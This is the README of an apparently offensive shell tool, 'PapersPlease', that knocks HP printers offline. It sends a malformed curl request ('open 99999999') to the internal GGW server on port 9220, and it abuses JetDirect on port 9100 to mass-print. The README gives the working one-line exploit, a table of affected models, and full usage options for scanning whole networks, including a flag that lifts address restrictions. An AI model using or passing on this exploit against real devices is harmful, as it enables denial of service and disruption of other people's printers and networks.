
<div align="center">

<img src="./Assets/Papers_Please_Logo.png" width="20%" />
<br><br>
</div>

## Description

PapersPlease is an exploit that allows an attacker to perform a remote Denial of Service against an HP printer by exploiting the internal GGW server found on port 9220. The tool also comes with the ability to mass print documents from either a single printer 
or all printers on a network by abusing HPs JetDirect protocol found on port 9100.

## How It Works

While the inner workings are more complicated, the exploit in its purest form is as follows:
<br><br>
`curl [IP]:9220 -X 'open 99999999'`
<br><br>
Whats happening here is we are telling the internal GGW server to retrieve the process name running on index number 99999999. However upon receiving the request, the GGW server will instantly crash.
At this time it is unknown exactly why the GGW server crashes when receiving such a request as it is well within range of the allowed index number length which is any number <= 19 digits. In addition, any index number 8 or 9 digits in length will cause the GGW server to crash.

## Known Affected Models
| Model | DoS | Mass Print | GGW Version |
| :---:  | :---: | :---: | :---: |
| HP Envy 7640 |  True  |  False  |  Version: 1.0  |
| HP OfficeJet Pro 6978 |  True  |  True  |  Version: 1.0  |

**NOTE**:<br>
While the above list provides known exploitable models, these do not need to be known to an attacker prior to exploiting.

## Required Software

Android users will need to install <a href="https://termux.com/">Termux</a> from the <a href="https://play.google.com/store/apps/details?id=com.termux">Google Play Store</a>.<br>
Termux is only available for **Android 5.0 and later**.

| Package | Version | Platform |
| :---:   | :---:   | :---:    |
| Netcat-openbsd |  1.105-7ubuntu1  |  x86-64  |
| Grep (GNU) |  2.25  |  x86-64  |
| Sed (GNU) |  4.2.2  |  x86-64  |
| Busybox |  1.30.1  |  Android  |
| Iproute2 |  4.3.0  |  x86-64  |
| Parallel | 20161222 (x86-64),20180222 (Android) |  Both  |
| Curl |  7.47.0-1ubuntu2.12  |  x86-64  |
| Bc |  1.06.95 (x86-64),1.07.1 (Android)  |  Both  |

**NOTE**:<br>
Exact software versions are not required. They are only present as a reference for debugging purposes. 

## How To Use

Papers_Please is designed to be very quick and simple to use, often times not requiring flags in order to run. You can specify a **network range** with the `--network` flag or a **single host** with the `--target` flag. You can optimize Papers_Please through the `--jobs`, `--proc`, and `--slots` flags. Optimizations are active by default with values of: 0, 1, and 252 respectively. By default or when passing the `--network` flag Papers_Please will automatically scan for printers. Automatic scanning can be disabled with the `--no-scan` flag. Additionally Papers_Please can **mass print** by passing the `--papyrus` flag. This will cause Papers_Please to connect to port 9100 (JetDirect) on the remote host, then immediately disconnect. Which in some cases causes a document to be printed. Finally, to **disable all address restrictions**, pass the `--allow-all` flag. By specifying said flag, all public and private IP addresses will be allowed in addition to all CIDR prefixes less-than or equal to 30.

## Usage

```
./Papers_Please.sh [OPTION]
OPTION:			    DESCRIPTION:
-t, --target={IP}	    Specify a specific
			    target rather than
		     	    all addresses on
			    the network.

-n, --network={IP/CIDR}     Manually specify the
			    network address for
			    the current network
			    you are on.

--papyrus={N}	    	    Number of jobs to
			    send to the printer
			    this should cause
			    the printer to print
			    N number of pages.

-i, --interval={N}  	    The interval before
			    another job is sent
			    to the printer. Where
			    N can be a decimal
			    i.e. 0.1 or a whole
			    number. The default
			    interval is 1.

-j, --jobs={-N|+N|N%|N}     Number of jobs to
			    run. Passes value
			    to parallel.
			    Defaults to 0.

-p, --proc={-N|+N|N%|N}	    Define the maximum
			    N of processes that
			    can be active at a
			    time. Defaults to
			    1.

-s, --slots={-N|+N|N%|N}    The amount of
			    'slots' available
			    to be used by
			    parallel for jobs.
			    Default is 252.

-P, --port={PORT} 	    Specify a specific 
			    port. Useful for 
			    port-forwarded
			    hosts. Port number 
			    is set automatically 
			    based on the attack
			    being preformed.
			    PORT can be any
			    number ranging
			    from 1 to 65535. 

-a, --allow-all		    All address ranges 
			    are allowed. BE CAREFUL 
			    in this mode as it
			    permits scanning of
			    ANY address without
			    restriction.

--no-scan		    Disables the automatic
			    printer discovery scan.
			    By disabling this function
			    the attacker might not
			    know how many hosts were
			    successfully brought
			    down.

--no-check		    Will skip dependency
                            checking.

-q, --quiet		    Suppress output to
			    terminal. Only the
			    progress bar from
			    parallel will be
			    printed to the
			    terminal in this
			    mode.

-v, --version		    Print version
			    information
			    then exit.

-h, --help		    Print help
			    dialog then
			    exit.
```
